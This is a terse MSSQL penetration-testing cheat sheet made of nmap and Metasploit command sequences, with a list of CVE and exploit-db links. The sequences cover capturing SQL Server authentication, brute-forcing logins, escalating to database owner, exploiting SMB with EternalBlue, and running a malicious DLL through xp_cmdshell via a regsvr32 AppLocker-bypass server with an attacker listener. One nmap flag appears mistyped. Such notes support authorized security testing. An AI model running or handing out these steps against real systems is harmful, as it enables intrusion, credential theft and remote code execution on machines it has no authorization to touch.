# MSSQL Pentesting
## CVEs: Common Vulnerabilities and Exposures
* [Uninitialized Memory -SQL Server Remote Code Execution Vulnerability](https://cve.mitre.org/cgi-bin/cvename.cgi?name=CVE-2015-1763)
* [SQL Server Remote Code Execution Vulnerability](https://cve.mitre.org/cgi-bin/cvename.cgi?name=CVE-2015-1762)
* [SQL Server Elevation of Privilege Vulnerability](https://cve.mitre.org/cgi-bin/cvename.cgi?name=CVE-2015-1761)
* [Microsoft SQL Server Stack Overrun Vulnerability](https://cve.mitre.org/cgi-bin/cvename.cgi?name=CVE-2014-4061)
* [MSCOMCTL.OCX RCE Vulnerability](https://cve.mitre.org/cgi-bin/cvename.cgi?name=CVE-2012-1856)

## Exploit-db exploits
* [XAMPP for Windows 1.6.0a - 'mssql_connect()' Remote Buffer Overflow](https://www.exploit-db.com/exploits/3738)
* [PHP 4.4.6 - 'mssql_[p]connect()' Local Buffer Overflow](https://www.exploit-db.com/exploits/3417)
* [ADODB < 4.70 - 'tmssql.php' Denial of Service](https://www.exploit-db.com/exploits/1651)
* [MSSQL 7.0 - Remote Denial of Service](https://www.exploit-db.com/exploits/562)
* [Microsoft SQL Server - sp_replwritetovarbin Memory Corruption](https://www.exploit-db.com/exploits/16392)
* [Microsoft Windows Server 2008 R2 (x64) - 'SrvOs2FeaToNt' SMB Remote Code Execution](https://www.exploit-db.com/exploits/41987)

## NMAP
### Recon
**Quickscan**
 `nmap -sV -T4 -O -F --version-light <ip>`
 **version of database**
 `nmap -p <port> -A <ip>`
 **Bypass Firewall**
 `nmap -sC <ip> -sV -0`

## Metasploit
### Recon
`use auxiliary/scanner/mssql/mssql_ping`
`set RHOSTS <ip>`
`exploit`

### Authentication Capture: MSSQL
`use auxiliary/server/capture/mssql`
`show actions `
`set ACTION <action-name> `
`show options `
`set <options>`
`run`

### SMB port 445
`use auxiliary/scanner/smb/smb_ms17_010`
`set RHOSTS <ip>`
`set THREADS 10`
`run`
**exploit it**
`use exploit/windows/smb/ms17_010_eternalblue`
`set RHOST <ip>`
`exploit -j`

### Get Credentials
`use auxiliary/scanner/mssql/mssql_login`
`set RHOSTS <ip>`
`run`

## with credentials
`use auxiliary/admin/mssql/mssql_enum`
`set RHOSTS <ip>`
`set password <pswd>`
`run`

#### beware of
**Xp-cmdshell is enabled**: execute commands on the remote system through the SQL Server

### Identify SQL Server Logins
`use auxiliary/admin/mssql/mssql_enum_sql_logins`
`set RHOSTS <ip>`
`set PASSWORD <pswd>`
`run`

### Identify Database owner
`use auxiliary/admin/mssql/mssql_escalate_dbowner`
`set RHOSTS <ip>`
`set PASSWORD <pswd>`
`run`

## Execute malicious .dll code through xp-cmdshell as CMD statement
`use exploit/windows/misc/regsvr32_applocker_bypass_server`
`set LHOST <ip>`
`set LPORT 4455`
`run`

